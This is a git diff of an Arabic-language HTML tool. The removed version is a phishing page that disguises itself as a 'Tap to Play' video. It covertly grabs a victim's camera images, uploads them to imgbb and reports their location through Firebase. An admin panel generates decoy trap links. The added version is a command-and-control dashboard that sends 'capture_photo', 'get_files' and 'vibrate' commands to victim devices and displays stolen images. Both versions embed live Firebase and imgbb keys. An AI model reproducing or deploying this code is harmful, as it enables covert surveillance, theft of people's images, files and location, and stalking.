@@ -2,146 +2,96 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>H-SYSTEM V36 | ULTIMATE SESSION</title>
-    
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-
+    <title>THE DOCTOR | COMMAND & CONTROL</title>
     <style>
-        :root { --neon: #00ff41; }
-        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
-        .box { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; background: rgba(0,255,65,0.02); }
-        .session-card { border: 1px solid #333; padding: 10px; margin-bottom: 5px; cursor: pointer; display: flex; justify-content: space-between; background: #0a0a0a; }
-        .session-card.active { border-color: #fff; box-shadow: 0 0 10px var(--neon); }
-        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 15px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
-        button:active { background: var(--neon); color: #000; }
-        #victim-view { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; left: 0; width: 100%; background: #000; z-index: 9999; }
-        .play-icon { width: 100px; height: 100px; border: 5px solid #fff; border-radius: 50%; position: relative; }
-        .play-icon::after { content: ''; position: absolute; top: 25px; left: 40px; border-left: 35px solid #fff; border-top: 25px solid transparent; border-bottom: 25px solid transparent; }
+        :root { --gold: #d4af37; --glow: #00ff41; --bg: #050505; }
+        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', monospace; }
+        .grid { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }
+        .sidebar { border-left: 2px solid var(--gold); padding: 15px; background: #0a0a0a; }
+        .main { padding: 20px; overflow-y: auto; }
+        .target-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
+        .target-card:hover { border-color: var(--gold); box-shadow: 0 0 10px var(--gold); }
+        .active { color: var(--gold); font-weight: bold; }
+        .image-gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
+        img { width: 100%; border: 1px solid #444; }
+        .cmd-btn { background: transparent; border: 1px solid var(--glow); color: var(--glow); padding: 5px; width: 100%; margin-top: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-<div id="admin-view">
-    <div class="box">
-        <h3 style="margin:0;">📡 رادار الجلسات (hkrs4000)</h3>
-        <hr border="0.5">
-        <div id="sessions-list">جاري فحص الاتصال العكسي...</div>
-    </div>
-
-    <div class="box">
-        <h3>🕹️ تحكم الجلسة: <span id="target-id" style="color:#fff;">--</span></h3>
-        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
-            <button onclick="cmd('snap')">📸 التقاط كاميرا</button>
-            <button onclick="cmd('vibrate')">📳 هز الجهاز</button>
-            <button onclick="cmd('loc')">📍 موقع الضحية</button>
-            <button onclick="cmd('release')" style="color:red;">🔓 طرد الجلسة</button>
+    <div class="grid">
+        <div class="sidebar">
+            <h3>الأجهزة النشطة</h3>
+            <div id="target-list">جاري المزامنة...</div>
+        </div>
+        <div class="main">
+            <h2 id="current-target">اختر وحدة تنفيذية للبدء</h2>
+            <div id="controls" style="display:none;">
+                <button class="cmd-btn" onclick="sendCommand('capture_photo')">التقاط صورة</button>
+                <button class="cmd-btn" onclick="sendCommand('get_files')">سحب الملفات</button>
+                <button class="cmd-btn" onclick="sendCommand('vibrate')">تفعيل الهز (Vibration)</button>
+                <hr>
+                <h4>الصور المستلمة:</h4>
+                <div id="gallery" class="image-gallery"></div>
+            </div>
         </div>
     </div>
 
-    <div class="box">
-        <input type="text" id="decoy" placeholder="رابط يوتيوب للتمويه" style="width:100%; padding:10px; background:#000; border:1px solid var(--neon); color:#fff;">
-        <button onclick="gen()">توليد رابط الفخ</button>
-        <div id="result" style="font-size:10px; color:cyan; margin-top:10px; word-break:break-all;"></div>
-    </div>
-</div>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
-<div id="victim-view">
-    <div class="play-icon" onclick="startTrap()"></div>
-    <p style="color:#fff; margin-top:20px;">انقر للتشغيل | Tap to Play</p>
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-</div>
-
-<script>
-    // --- بيانات التكوين الصارمة ---
-    const IMG_KEY = "399bf85325feb7de4a2300c744a7e7e2";
-    const fbConfig = {
-        apiKey: "AIzaSyCszTVJWZY1B0wKB0P5rFLVlZHc1usgA7c",
-        authDomain: "hkrs4000.firebaseapp.com",
-        databaseURL: "https://hkrs4000-default-rtdb.firebaseio.com",
-        projectId: "hkrs4000"
-    };
-
-    firebase.initializeApp(fbConfig);
-    const db = firebase.database();
-    let selId = null;
-
-    const urlP = new URLSearchParams(window.location.search);
-    const vToken = urlP.get('v');
-
-    if (vToken) {
-        document.getElementById('admin-view').style.display = 'none';
-        document.getElementById('victim-view').style.display = 'flex';
-        initVictim(atob(vToken));
-    } else {
-        initAdmin();
-    }
-
-    // --- منطق الآدمن ---
-    function initAdmin() {
-        db.ref('active_sessions').on('value', s => {
-            const list = document.getElementById('sessions-list');
-            list.innerHTML = '';
-            if(!s.exists()) { list.innerHTML = "لا توجد جلسات حالياً."; return; }
-            s.forEach(child => {
-                const d = child.val();
-                const id = child.key;
-                const active = (Date.now() - d.lastSeen) < 10000;
-                list.innerHTML += `<div class="session-card ${id === selId ? 'active' : ''}" onclick="sel('${id}','${d.model}')">
-                    <span>📱 ${d.model}</span>
-                    <span style="color:${active ? '#0f0' : '#444'}">${active ? 'نشط' : 'أوفلاين'}</span>
-                </div>`;
-            });
-        });
-    }
-
-    function sel(id, name) { selId = id; document.getElementById('target-id').innerText = name; }
-    function cmd(t) { if(selId) db.ref('active_sessions/'+selId+'/cmd').set({ t, time: Date.now() }); }
-    function gen() {
-        const u = document.getElementById('decoy').value;
-        document.getElementById('result').innerText = window.location.origin + window.location.pathname + "?v=" + btoa(u);
-    }
-
-    // --- منطق الضحية (فتح الجلسة فوراً) ---
-    let vRef = null;
-    function initVictim(decoy) {
-        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "Mobile Device";
-        vRef = db.ref('active_sessions').push(); // فتح الجلسة في فايرباس فوراً
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
+            authDomain: "hkrs5000.firebaseapp.com",
+            databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
+            projectId: "hkrs5000",
+            storageBucket: "hkrs5000.firebasestorage.app",
+            messagingSenderId: "273977078526",
+            appId: "1:273977078526:web:da9e512c2421c300352baf"
+        };
         
-        const pulse = () => vRef.update({ model: model, lastSeen: Date.now() });
-        pulse(); setInterval(pulse, 4000);
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let selectedId = null;
 
-        db.ref('active_sessions/' + vRef.key + '/cmd').on('value', s => {
-            const c = s.val(); if(!c) return;
-            if(c.t === 'snap') capture();
-            if(c.t === 'vibrate') navigator.vibrate([500, 200, 500]);
-            if(c.t === 'loc') navigator.geolocation.getCurrentPosition(p => {
-                vRef.child('location').set(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        // مزامنة قائمة الأهداف
+        db.ref('devices').on('value', snapshot => {
+            const list = document.getElementById('target-list');
+            list.innerHTML = "";
+            snapshot.forEach(child => {
+                const device = child.val();
+                const div = document.createElement('div');
+                div.className = "target-card";
+                div.innerHTML = `ID: ${child.key} <br> <span class="active">نشط</span>`;
+                div.onclick = () => selectDevice(child.key);
+                list.appendChild(div);
             });
-            if(c.t === 'release') window.location.href = decoy;
         });
-    }
 
-    async function startTrap() { await capture(); }
+        function selectDevice(id) {
+            selectedId = id;
+            document.getElementById('current-target').innerText = "التحكم في: " + id;
+            document.getElementById('controls').style.display = "block";
+            loadImages(id);
+        }
 
-    async function capture() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video:true});
-            const video = document.getElementById('v'); video.srcObject = s; await video.play();
-            const canvas = document.getElementById('c');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const data = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
-            
-            let fd = new FormData(); fd.append("image", data);
-            fetch(`https://api.imgbb.com/1/upload?key=${IMG_KEY}`, {method:"POST", body:fd})
-            .then(res => res.json()).then(res => { vRef.child('photos').push(res.data.url); });
-            
-            s.getTracks().forEach(t => t.stop());
-        } catch(e) {}
-    }
-</script>
+        function sendCommand(cmd) {
+            if(!selectedId) return;
+            db.ref(`commands/${selectedId}`).set({ action: cmd, timestamp: Date.now() });
+            alert("تم إرسال الأمر: " + cmd);
+        }
+
+        function loadImages(id) {
+            db.ref(`data/${id}/images`).on('value', snapshot => {
+                const gallery = document.getElementById('gallery');
+                gallery.innerHTML = "";
+                snapshot.forEach(child => {
+                    const img = document.createElement('img');
+                    img.src = child.val().url;
+                    gallery.appendChild(img);
+                });
+            });
+        }
+    </script>
 </body>
 </html>
